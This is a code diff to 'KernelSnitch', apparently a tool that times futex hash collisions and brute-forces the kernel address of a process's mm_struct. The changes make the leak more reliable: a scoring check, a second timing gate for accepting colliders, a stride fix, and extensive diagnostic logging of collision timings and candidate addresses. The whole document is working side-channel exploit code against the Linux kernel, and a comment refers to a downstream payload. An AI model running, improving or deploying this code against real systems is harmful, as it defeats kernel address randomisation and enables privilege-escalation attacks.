@@ -68,7 +68,7 @@ char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
 };
 
 struct kernelsnitch_shared_state {
-    volatile size_t mm_struct_sz;
+    volatile size_t mm_struct_stride;
     volatile size_t mm_slab_order;
     volatile size_t verbose;
 
@@ -86,6 +86,20 @@ struct kernelsnitch_shared_state {
     volatile size_t found;
     volatile size_t mm_struct;
     volatile size_t scan_done;
+    /* Diagnostic only: best partial collision agreement seen in the current
+     * brute-force pass, and the candidate address that produced it. Written
+     * by leak threads, read after join. Never affects the leak itself. */
+    volatile size_t best_score;
+    volatile size_t best_candidate;
+    /* Diagnostic only: re-pile t3 per accepted collider (index matches
+     * futex_addrs) and the prove threshold, retained from the collision
+     * phase. No extra measurements are taken. */
+    volatile size_t *collide_t3;
+    /* Diagnostic only: gate's second re-pile t3 per accepted collider,
+     * retained alongside collide_t3 (same indexing). Written once per
+     * accepted collider during the existing prove step. */
+    volatile size_t *collide_t3b;
+    volatile size_t collide_thresh;
 
     pthread_t *tids;
     size_t identity_diff;
@@ -203,13 +217,88 @@ struct mm_leak_arg {
     int sweep_tags;
 };
 
-static int __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t candidate)
+/* Count how many of the colliding addresses hash into the same bucket as
+ * the target under the candidate mm_struct address. */
+static size_t __mm_candidate_score(struct kernelsnitch_shared_state *ks, size_t candidate)
 {
+    size_t agree = 0;
     for (size_t i = 1; i < ks->collisions; ++i) {
-        if (futex_hash(ks->futex_addrs[0], candidate) != futex_hash(ks->futex_addrs[i], candidate))
-            return 0;
+        if (futex_hash(ks->futex_addrs[0], candidate) == futex_hash(ks->futex_addrs[i], candidate))
+            ++agree;
     }
-    return 1;
+    return agree;
+}
+
+/* Diagnostic only: remember the best partial score seen in this pass and the
+ * candidate that produced it. Concurrent updates can only under-report the
+ * maximum; the leak logic never reads these fields. */
+static void __mm_note_score(struct kernelsnitch_shared_state *ks, size_t candidate, size_t score)
+{
+    size_t cur = ks->best_score;
+    while (score > cur) {
+        if (__atomic_compare_exchange_n((size_t *)&ks->best_score, &cur, score,
+                                        0, __ATOMIC_RELAXED, __ATOMIC_RELAXED)) {
+            ks->best_candidate = candidate;
+            break;
+        }
+    }
+}
+
+/* Diagnostic only: cumulative record of leak-pass best candidates across
+ * attempts in this process. Written once per leak pass, read-only
+ * afterwards. Distinguishes a stable address repeatedly selected (a real
+ * signal) from scattered one-off agreements (chance). File-static is safe:
+ * only one translation unit includes this header. */
+#define MM_SEL_DIST_MAX 64
+struct mm_sel_entry {
+    size_t addr;
+    size_t count;
+    size_t n_canonical;
+    size_t n_tag;
+};
+static struct mm_sel_entry g_mm_sel_dist[MM_SEL_DIST_MAX];
+static size_t g_mm_sel_dist_n = 0;
+
+static void __mm_record_selection(size_t addr, int is_canonical, int is_tag)
+{
+    size_t i;
+    if (!addr)
+        return;
+    for (i = 0; i < g_mm_sel_dist_n; ++i) {
+        if (g_mm_sel_dist[i].addr == addr) {
+            g_mm_sel_dist[i].count++;
+            g_mm_sel_dist[i].n_canonical += (size_t)!!is_canonical;
+            g_mm_sel_dist[i].n_tag += (size_t)!!is_tag;
+            return;
+        }
+    }
+    if (g_mm_sel_dist_n < MM_SEL_DIST_MAX) {
+        g_mm_sel_dist[g_mm_sel_dist_n].addr = addr;
+        g_mm_sel_dist[g_mm_sel_dist_n].count = 1;
+        g_mm_sel_dist[g_mm_sel_dist_n].n_canonical = (size_t)!!is_canonical;
+        g_mm_sel_dist[g_mm_sel_dist_n].n_tag = (size_t)!!is_tag;
+        g_mm_sel_dist_n++;
+    }
+}
+
+/* Diagnostic only: recompute, read-only, which collision addresses agreed
+ * with the target at the recorded best candidate. Called once per pass after
+ * the leak threads have joined; deterministic and behavior-free. */
+static void __mm_print_best_detail(struct kernelsnitch_shared_state *ks)
+{
+    if (!ks->best_candidate)
+        return;
+    char disagree[32];
+    size_t pos = 0;
+    for (size_t i = 1; i < ks->collisions && pos < sizeof(disagree) - 3; ++i) {
+        if (futex_hash(ks->futex_addrs[0], ks->best_candidate) !=
+            futex_hash(ks->futex_addrs[i], ks->best_candidate))
+            pos += (size_t)snprintf(disagree + pos, sizeof(disagree) - pos,
+                                    "%s%zu", pos ? "," : "", i);
+    }
+    pr_info("bruteforce best detail: %zu/%zu agree at 0x%zx, disagree idx: [%s]\n",
+            ks->best_score, ks->collisions - 1, ks->best_candidate,
+            pos ? disagree : "-");
 }
 
 static void __mm_mark_found(struct kernelsnitch_shared_state *ks, size_t candidate)
@@ -227,6 +316,7 @@ static void *__mm_leak(void *arg)
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = PAGE_SIZE << ks->mm_slab_order;
+    size_t want = ks->collisions - 1; /* agreeing addresses needed for a match */
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
@@ -237,11 +327,13 @@ static void *__mm_leak(void *arg)
             size_t slab_limit = slab_addr + mm_slab_sz;
             if (slab_limit > slab_end)
                 slab_limit = slab_end;
-            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found; mm_struct_candidate += ks->mm_struct_stride) {
 
                 if (mm_leak_arg->try_canonical) {
                     size_t canonical_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
-                    if (__mm_candidate_matches(ks, canonical_candidate)) {
+                    size_t score = __mm_candidate_score(ks, canonical_candidate);
+                    __mm_note_score(ks, canonical_candidate, score);
+                    if (score == want) {
                         __mm_mark_found(ks, canonical_candidate);
                         break;
                     }
@@ -252,7 +344,9 @@ static void *__mm_leak(void *arg)
                         if (tag_candidate == 15)
                             continue;
                         size_t tagged_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (tag_candidate << 56);
-                        if (__mm_candidate_matches(ks, tagged_candidate)) {
+                        size_t score = __mm_candidate_score(ks, tagged_candidate);
+                        __mm_note_score(ks, tagged_candidate, score);
+                        if (score == want) {
                             __mm_mark_found(ks, tagged_candidate);
                             break;
                         }
@@ -270,6 +364,9 @@ static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_can
     /* the leak check discards a match past the measured end, so no slice
      * scans past it */
     size_t ceiling = MIN(g_direct_map_end, IDENTITY_END);
+    /* diagnostic: fresh best-score tracking for this pass */
+    ks->best_score = 0;
+    ks->best_candidate = 0;
     for (size_t i = 0; i < ks->thread_cnt; ++i) {
         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
         mm_leak_arg->ks = ks;
@@ -288,6 +385,21 @@ static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_can
     }
     for (size_t i = 0; i < ks->thread_cnt; ++i)
         pthread_join(ks->tids[i], 0);
+    /* diagnostic: highest partial agreement seen in this pass. A repeated
+     * best of (collisions-2)/(collisions-1) on failed passes points at a
+     * single false-positive collision address. */
+    pr_info("bruteforce best: %zu/%zu addrs agree at 0x%zx (canonical=%d tags=%d)\n",
+            ks->best_score, ks->collisions - 1, ks->best_candidate,
+            try_canonical, sweep_tags);
+    /* diagnostic only: per-pass best with its pass type, plus a cumulative
+     * record used to tell random agreement from a repeatedly selected
+     * address. Read-only with respect to the leak. */
+    pr_info("leak_pass_summary: canonical=%d tags=%d best=0x%zx agree=%zu/%zu\n",
+            try_canonical, sweep_tags, ks->best_candidate,
+            ks->best_score, ks->collisions - 1);
+    fflush(stdout);
+    __mm_record_selection(ks->best_candidate, try_canonical, sweep_tags);
+    __mm_print_best_detail(ks);
 }
 
 /****************************************************************************************************************/
@@ -296,19 +408,20 @@ static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_can
 
 /**
  * Setup phase of KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
+ * @arg __mm_struct_stride: SLUB object stride (s->size) of the mm_struct cache;
+ * NOT sizeof(struct mm_struct)
  * @arg __mm_slab_order: the order of the mm_struct slab
  * @arg __thread_cnt: thread count used for the bruteforcing phase
  * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
  * @arg __verbose: amount of print info, 1 enables and 0 disables
  * @return shared KernelSnitch state
  */
-struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
+struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_stride, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
 {
     struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->mm_struct = -1;
     ks->scan_done = 0;
-    ks->mm_struct_sz = __mm_struct_sz;
+    ks->mm_struct_stride = __mm_struct_stride;
     ks->mm_slab_order = __mm_slab_order;
     ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
     ks->thread_cnt = __thread_cnt;
@@ -328,10 +441,15 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->identity_diff = ((MIN(g_direct_map_end, IDENTITY_END) - IDENTITY_START)/ks->thread_cnt);
 
     ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    /* diagnostic only: retain each accepted collider's re-pile t3 and the
+     * prove threshold; written during the existing prove step, no extra work */
+    ks->collide_t3 = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    /* diagnostic only: mirror allocation for the gate's second t3 */
+    ks->collide_t3b = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
 
-    if (ks->verbose) pr_info("parameters cpu (%zu) mm_struct sz (%zx) mm slab order (%zu) thread cnt (%zu) collisions (%zu)\n",
+    if (ks->verbose) pr_info("parameters cpu (%zu) mm_struct stride (%zx) mm slab order (%zu) thread cnt (%zu) collisions (%zu)\n",
         ks->cpu_cnt,
-        ks->mm_struct_sz,
+        ks->mm_struct_stride,
         ks->mm_slab_order,
         ks->thread_cnt,
         ks->collisions);
@@ -418,8 +536,26 @@ static size_t __prove_collision_pool(struct kernelsnitch_shared_state *ks, coll_
     for (size_t j = 0; j < n_alive && count < wanted; ++j) {
         size_t t3 = __measure(alive[j], verify_repeat, verify_avg);
         if (t3 > verify_approx_time*KERNELSNITCH_THRESHOLD_MULT) {
-            ks->futex_addrs[++count] = alive[j];
-            if (ks->verbose) pr_info("  collider %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
+            /* reproducibility gate: drain and re-pile again, then require the
+             * same candidate to clear the same bar a second time, so a single
+             * transient t3 spike cannot be accepted */
+            __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, NULL, NULL, 0);
+            usleep(200000);
+            __increase(ks, id, APPENDED_FUTEXES);
+            size_t t3b = __measure(alive[j], verify_repeat, verify_avg);
+            if (t3b > verify_approx_time*KERNELSNITCH_THRESHOLD_MULT) {
+                ks->futex_addrs[++count] = alive[j];
+                /* diagnostic only: retain the proof margin for the accepted set */
+                ks->collide_t3[count] = t3;
+                /* diagnostic only: retain the gate's second t3 as well */
+                ks->collide_t3b[count] = t3b;
+                ks->collide_thresh = verify_approx_time*KERNELSNITCH_THRESHOLD_MULT;
+                pr_info("collider_accept[%zu]: addr=0x%zx first_t3=%zu verify_t3=%zu thresh=%zu\n",
+                        count, alive[j], t3, t3b,
+                        verify_approx_time*KERNELSNITCH_THRESHOLD_MULT);
+                fflush(stdout);
+                if (ks->verbose) pr_info("  collider %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
+            }
         } else if (ks->verbose) {
             pr_info("  reject   %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
         }
@@ -430,6 +566,107 @@ static size_t __prove_collision_pool(struct kernelsnitch_shared_state *ks, coll_
         usleep(200000);
     }
     return count;
+}
+
+/* Diagnostic only: re-run the prove step's drain/re-pile sequence on the
+ * ACCEPTED colliders, then repeat the same sequence a few more times,
+ * logging every round. Reuses the existing pile target (futex_addrs[0]),
+ * drain primitive, re-pile primitive, and the prove step's measurement
+ * parameters (MEASURE_SLOW_REPEAT/AVG) verbatim. Acceptance, thresholds,
+ * timing parameters, spray/retry counts, hash logic, candidate scanning,
+ * and payload behavior are untouched. The pile is left re-piled, exactly
+ * as the prove step leaves it, so downstream behavior is unchanged. */
+#define MM_REVERIFY_DIAG_ROUNDS 3
+static void __mm_reverify_colliders(struct kernelsnitch_shared_state *ks)
+{
+    size_t drain_t[KERNELSNITCH_COLLISION_POOL];
+    size_t rep_min_t3[KERNELSNITCH_COLLISION_POOL];
+    size_t rep_max_t3[KERNELSNITCH_COLLISION_POOL];
+    size_t rep_min_t2[KERNELSNITCH_COLLISION_POOL];
+    size_t rep_max_t2[KERNELSNITCH_COLLISION_POOL];
+    /* diagnostic only: per-round selection under the prove conjunction,
+     * and round-0 drain t2 for the summary line. No new measurements. */
+    int sel_r0[KERNELSNITCH_COLLISION_POOL];
+    size_t rep_sel[KERNELSNITCH_COLLISION_POOL];
+    size_t drain0_t[KERNELSNITCH_COLLISION_POOL];
+    for (size_t i = 1; i < ks->collisions; ++i) {
+        rep_min_t3[i] = (size_t)-1; rep_max_t3[i] = 0;
+        rep_min_t2[i] = (size_t)-1; rep_max_t2[i] = 0;
+        sel_r0[i] = 0; rep_sel[i] = 0; drain0_t[i] = 0;
+    }
+
+    /* round 0: first re-verification (existing diagnostic line, unchanged) */
+    /* pass 1: drain the pile, mirroring __prove_collision_pool */
+    __futex((unsigned int *)ks->futex_addrs[0], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, NULL, NULL, 0);
+    usleep(200000);
+    for (size_t i = 1; i < ks->collisions; ++i)
+        drain_t[i] = __measure(ks->futex_addrs[i], MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
+    /* pass 2: re-pile, mirroring __prove_collision_pool (pile ID 128, as in
+     * __collision_pass) */
+    __increase(ks, 128, APPENDED_FUTEXES);
+    for (size_t i = 1; i < ks->collisions; ++i) {
+        size_t t3b = __measure(ks->futex_addrs[i], MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
+        size_t t3a = (size_t)ks->collide_t3[i];
+        size_t thresh = (size_t)ks->collide_thresh;
+        /* same conjunction the prove step applies: slow again past the
+         * existing bar, and collapsed to under half the piled time on drain */
+        int pass = (t3b > thresh) && (drain_t[i] < t3a / 2);
+        pr_info("reverify[%zu]: addr=0x%zx t3_first=%zu t3_verify=%zu t2_drain=%zu thresh=%zu %s\n",
+                i, (size_t)ks->futex_addrs[i], t3a, t3b, drain_t[i], thresh,
+                pass ? "PASS" : "FAIL");
+        fflush(stdout);
+        /* diagnostic only: retain round-0 selection for the summary line */
+        sel_r0[i] = pass;
+        drain0_t[i] = drain_t[i];
+    }
+
+    /* rounds 1..N: repeated diagnostic drain/re-pile with the same primitives */
+    for (size_t r = 1; r <= MM_REVERIFY_DIAG_ROUNDS; ++r) {
+        __futex((unsigned int *)ks->futex_addrs[0], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, NULL, NULL, 0);
+        usleep(200000);
+        for (size_t i = 1; i < ks->collisions; ++i)
+            drain_t[i] = __measure(ks->futex_addrs[i], MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
+        __increase(ks, 128, APPENDED_FUTEXES);
+        for (size_t i = 1; i < ks->collisions; ++i) {
+            size_t t3 = __measure(ks->futex_addrs[i], MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
+            if (t3 < rep_min_t3[i]) rep_min_t3[i] = t3;
+            if (t3 > rep_max_t3[i]) rep_max_t3[i] = t3;
+            if (drain_t[i] < rep_min_t2[i]) rep_min_t2[i] = drain_t[i];
+            if (drain_t[i] > rep_max_t2[i]) rep_max_t2[i] = drain_t[i];
+            /* diagnostic only: same conjunction the prove step applies */
+            if ((t3 > (size_t)ks->collide_thresh) &&
+                (drain_t[i] < (size_t)ks->collide_t3[i] / 2))
+                rep_sel[i]++;
+            pr_info("reverify_rep[%zu]: round=%zu addr=0x%zx t3=%zu t2_drain=%zu thresh=%zu\n",
+                    i, r, (size_t)ks->futex_addrs[i], t3, drain_t[i],
+                    (size_t)ks->collide_thresh);
+            fflush(stdout);
+        }
+    }
+
+    /* distribution summary over the repeated diagnostic rounds */
+    for (size_t i = 1; i < ks->collisions; ++i) {
+        pr_info("reverify_dist[%zu]: addr=0x%zx rounds=%d t3_min=%zu t3_max=%zu t2_min=%zu t2_max=%zu t3_first=%zu\n",
+                i, (size_t)ks->futex_addrs[i], MM_REVERIFY_DIAG_ROUNDS,
+                rep_min_t3[i], rep_max_t3[i], rep_min_t2[i], rep_max_t2[i],
+                (size_t)ks->collide_t3[i]);
+        fflush(stdout);
+    }
+
+    /* diagnostic only: one consolidated line per accepted collider. first
+     * and second t3 are retained from the prove+gate; the third comes from
+     * the independent drain/re-pile above (same futex object, same drain
+     * and re-pile sequence as the proof path). stable=1 means the collider
+     * cleared the prove conjunction in every verification cycle. */
+    for (size_t i = 1; i < ks->collisions; ++i) {
+        int stable = sel_r0[i] && (rep_sel[i] == MM_REVERIFY_DIAG_ROUNDS);
+        pr_info("collider_summary[%zu]: addr=0x%zx t3_first=%zu t3_second=%zu t3_drain1=%zu drain1_sel=%d rep_sel=%zu/%d t3_rep_min=%zu t3_rep_max=%zu stable=%d\n",
+                i, (size_t)ks->futex_addrs[i],
+                (size_t)ks->collide_t3[i], (size_t)ks->collide_t3b[i],
+                drain0_t[i], sel_r0[i], rep_sel[i], MM_REVERIFY_DIAG_ROUNDS,
+                rep_min_t3[i], rep_max_t3[i], stable);
+        fflush(stdout);
+    }
 }
 
 static size_t __verify_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *best, size_t verify_approx_time, size_t verify_repeat, size_t verify_avg, size_t verify_limit, size_t id, int drain_on_short)
@@ -560,9 +797,31 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
     if (ks->verbose) pr_info("start bruteforcing\n");
     reset_cpu_pin();
 
+    /* diagnostic: the accepted collision set and its proof margins, as
+     * retained by the prove step (no extra measurements) */
+    for (size_t i = 1; i < ks->collisions; ++i) {
+        pr_info("collision[%zu]: addr=0x%zx t3=%zu thresh=%zu\n",
+                i, (size_t)ks->futex_addrs[i],
+                (size_t)ks->collide_t3[i], (size_t)ks->collide_thresh);
+    }
+    fflush(stdout);
+
+    /* diagnostic only: fresh drain/re-pile re-verification of the accepted
+     * set; logs per-index second t3, changes nothing */
+    __mm_reverify_colliders(ks);
+
     __run_mm_leak_pass(ks, 1, 0);
     if (!ks->found)
         __run_mm_leak_pass(ks, 0, 1);
+    /* diagnostic only: cumulative selection distribution across all leak
+     * passes in this process. A stable address with selected >> 1 is a
+     * reproducible signal; scattered selected=1 entries are chance. */
+    pr_info("leak_selection_dist: %zu distinct addresses\n", g_mm_sel_dist_n);
+    for (size_t i = 0; i < g_mm_sel_dist_n; ++i)
+        pr_info("leak_selection_dist: addr=0x%zx selected=%zu canonical=%zu tag=%zu\n",
+                g_mm_sel_dist[i].addr, g_mm_sel_dist[i].count,
+                g_mm_sel_dist[i].n_canonical, g_mm_sel_dist[i].n_tag);
+    fflush(stdout);
     ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
 }
 
@@ -580,6 +839,10 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
     ks->tids = 0;
     munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
     ks->futex_addrs = 0;
+    munmap((void *)ks->collide_t3, sizeof(size_t)*(ks->collisions + 1));
+    ks->collide_t3 = 0;
+    munmap((void *)ks->collide_t3b, sizeof(size_t)*(ks->collisions + 1));
+    ks->collide_t3b = 0;
     munmap((void *)ks->futexes, FUTEX_SZ);
     ks->futexes = 0;
     size_t ret = ks->mm_struct;
@@ -590,16 +853,17 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
 
 /**
  * Performs KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
+ * @arg __mm_struct_stride: SLUB object stride (s->size) of the mm_struct cache;
+ * NOT sizeof(struct mm_struct)
  * @arg __mm_slab_order: the order of the mm_struct slab
  * @arg __thread_cnt: thread count used for the bruteforcing phase
  * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
  * @arg __verbose: amount of print info, 1 enables and 0 disables
  * @return the found mm_struct or -1 for not found
  */
-size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
+size_t kernelsnitch_param(size_t __mm_struct_stride, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
 {
-    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose);
+    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_stride, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose);
     if (ks->verbose) pr_info("===============================================\n");
     kernelsnitch_find_collisions(ks);
     if (ks->verbose) pr_info("===============================================\n");
@@ -632,10 +896,11 @@ void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
 
 /**
  * KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
+ * @arg __mm_struct_stride: SLUB object stride (s->size) of the mm_struct cache;
+ * NOT sizeof(struct mm_struct)
  * @return: the found mm_struct address
  */
-size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
+size_t kernelsnitch(size_t __mm_struct_stride, size_t __mm_slab_order)
 {
-    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0);
+    return kernelsnitch_param(__mm_struct_stride, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0);
 }
